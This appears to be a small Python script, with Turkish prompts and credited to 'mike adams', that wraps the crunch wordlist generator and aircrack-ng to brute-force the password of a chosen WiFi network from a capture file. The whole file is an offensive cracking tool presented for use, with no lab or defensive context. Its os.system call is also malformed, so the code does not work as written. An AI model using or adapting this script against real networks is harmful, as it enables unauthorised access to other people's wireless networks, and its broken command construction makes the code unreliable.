import os

print ("yapımcı: mike adams 19.07.2021")
print ("wifi hacking python")
sayimin = input("wordlist için minimum uzunluk sayısı: ")
sayimax = input("wordlist için maximum uzunluk sayısı: ")
harfler = input("wordlistte ne tür karakterler olacak: ")
id = input("attack yapacağınız internetin id'si: ")
dosyayol = input("dosya yolu nereye kaydedeceksiniz: ")
input("saldırı başlatılıyor...")
os.system("crunch", sayimin, sayimax, harfler, "| aircrack-ng -b", id, dosyayol, "-w-")
print("saldırı işlemi bitti.")
